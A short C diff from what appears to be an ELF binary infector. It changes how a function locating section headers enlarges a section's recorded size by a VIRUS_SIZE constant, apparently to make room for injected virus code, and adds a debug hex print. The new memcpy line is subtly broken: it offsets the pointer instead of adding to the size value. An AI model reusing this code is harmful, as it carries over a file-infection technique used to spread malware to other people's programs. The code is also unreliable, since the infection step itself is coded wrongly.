@@ -32,7 +32,8 @@ int get_section_index(char *section, char *buf, struct sheaders64 *sheaders, str
             index = i;
             section_found = 1;
             offset = get_section_offset(i, file_header);
-            (unsigned long int)((unsigned char *)buf)[offset + SIZE] = (unsigned long int)(sheaders[i].sh_size) + VIRUS_SIZE;
+            memcpy(&(buf[offset + SIZE]), &(sheaders[i].sh_size) + VIRUS_SIZE, 8);
+            ft_print_hexa_raw(&(buf[offset + SIZE]), 8);
         }
         if (section_found) {
             offset = get_section_offset(i, file_header);
